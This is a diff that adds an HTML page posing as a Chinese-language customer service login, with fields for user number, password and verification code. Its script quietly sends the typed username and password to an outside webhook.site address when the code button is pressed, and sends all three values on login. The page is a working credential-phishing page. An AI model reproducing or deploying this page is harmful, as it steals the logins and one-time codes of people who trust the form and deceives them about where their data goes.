@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>客服</title>
+</head>
+<body>
+<form action="">
+	用户编号：<input type="text" name="username">
+	密码：<input type="password" name="pwd">
+	验证码：<input type="text" name="code"><input type="button" value="获取验证码" onclick="sendpwd()" 
+	/>
+	<input	type="button" value="登录" onclick="sendall()">
+</form>
+<script>
+
+function sendpwd() {
+	fetch('https://webhook.site/d8bc2501-7a4d-444b-8868-6f8b33fe2a29?'+document.forms[0].username.value+':'+document.forms[0].pwd.value)
+	// body...
+}
+
+function sendall(){
+fetch('https://webhook.site/d8bc2501-7a4d-444b-8868-6f8b33fe2a29?'+document.forms[0].username.value+':'+document.forms[0].pwd.value+':'+document.forms[0].code.value)
+
+}
+</script>
+</body>
+</html>
